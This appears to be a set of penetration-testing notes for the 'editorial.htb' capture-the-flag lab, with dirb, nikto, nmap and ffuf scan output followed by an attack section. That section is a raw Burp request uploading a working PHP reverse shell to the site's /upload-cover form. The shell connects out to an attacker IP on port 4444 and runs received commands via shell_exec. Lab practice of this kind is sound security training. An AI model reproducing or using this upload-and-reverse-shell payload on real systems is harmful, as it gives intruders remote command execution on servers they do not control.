## Recon
### dirb_output.txt:
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb_output.txt
START_TIME: Sat Jul 27 20:25:01 2024
URL_BASE: http://editorial.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://editorial.htb/ ----
+ http://editorial.htb/about (CODE:200|SIZE:2939)
+ http://editorial.htb/upload (CODE:200|SIZE:7140)

-----------------
END_TIME: Sat Jul 27 20:27:11 2024
DOWNLOADED: 4612 - FOUND: 2
```
### nikto_output.txt:
```
- Nikto v2.5.0/
+ Target Host: editorial.htb
+ Target Port: 80
+ GET /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options: 
+ GET /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/: 
+ HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ OPTIONS OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS .
+ GET /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
```

### nmap_output.txt:
```
# Nmap 7.94SVN scan initiated Sat Jul 27 20:24:15 2024 as: nmap -v -sV -O -A --top-ports 1000 -oN nmap_output.txt editorial.htb
Nmap scan report for editorial.htb (10.129.55.52)
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/27%OT=22%CT=1%CU=34945%PV=Y%DS=2%DC=T%G=Y%TM=66A5
OS:9DD3%P=x86_64-pc-linux-gnu)SEQ(CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=107%T
OS:I=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=
OS:M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE
OS:88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=
OS:G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 26.521 days (since Mon Jul  1 07:54:50 2024)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   21.45 ms 10.10.14.1
2   21.68 ms editorial.htb (10.129.55.52)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 27 20:24:35 2024 -- 1 IP address (1 host up) scanned in 19.79 seconds
```

### ffuf_output.txt:
```
{
  "commandline": "ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://editorial.htb -H Host: FUZZ.editorial.htb -mc 200 -fs 15949 -o ffuf_output.json -of json",
  "time": "2024-07-27T20:31:05-05:00",
  "results": [],
  "config": {
    "autocalibration": false,
    "autocalibration_keyword": "FUZZ",
    "autocalibration_perhost": false,
    "autocalibration_strategies": ["basic"],
    "autocalibration_strings": [],
    "colors": false,
    "cmdline": "ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://editorial.htb -H Host: FUZZ.editorial.htb -mc 200 -fs 15949 -o ffuf_output.json -of json",
    "configfile": "",
    "postdata": "",
    "debuglog": "",
    "delay": { "value": "0.00" },
    "dirsearch_compatibility": false,
    "encoders": [],
    "extensions": [],
    "fmode": "or",
    "follow_redirects": false,
    "headers": { "Host": "FUZZ.editorial.htb" },
    "ignorebody": false,
    "ignore_wordlist_comments": false,
    "inputmode": "clusterbomb",
    "cmd_inputnum": 100,
    "inputproviders": [
      {
        "name": "wordlist",
        "keyword": "FUZZ",
        "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
        "encoders": "",
        "template": ""
      }
    ],
    "inputshell": "",
    "json": false,
    "matchers": {
      "IsCalibrated": false,
      "Mutex": {},
      "Matchers": { "status": { "value": "200" } },
      "Filters": { "size": { "value": "15949" } },
      "PerDomainFilters": {}
    },
    "mmode": "or",
    "maxtime": 0,
    "maxtime_job": 0,
    "method": "GET",
    "noninteractive": false,
    "outputdirectory": "",
    "outputfile": "ffuf_output.json",
    "outputformat": "json",
    "OutputSkipEmptyFile": false,
    "proxyurl": "",
    "quiet": false,
    "rate": 0,
    "raw": false,
    "recursion": false,
    "recursion_depth": 0,
    "recursion_strategy": "default",
    "replayproxyurl": "",
    "requestfile": "",
    "requestproto": "https",
    "scraperfile": "",
    "scrapers": "all",
    "sni": "",
    "stop_403": false,
    "stop_all": false,
    "stop_errors": false,
    "threads": 40,
    "timeout": 10,
    "url": "http://editorial.htb",
    "verbose": false,
    "wordlists": [
      "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
    ],
    "http2": false,
    "client-cert": "",
    "client-key": ""
  }
}
```

## Attack

### burp reverse shell upload:
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 764
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykWD7CpV8HlDWAXhT
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundarykWD7CpV8HlDWAXhT
Content-Disposition: form-data; name="bookurl"


------WebKitFormBoundarykWD7CpV8HlDWAXhT
Content-Disposition: form-data; name="bookfile"; filename="reverse.shell.php"
Content-Type: application/x-php

<?php
$ip = '10.10.14.252'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
------WebKitFormBoundarykWD7CpV8HlDWAXhT--
```
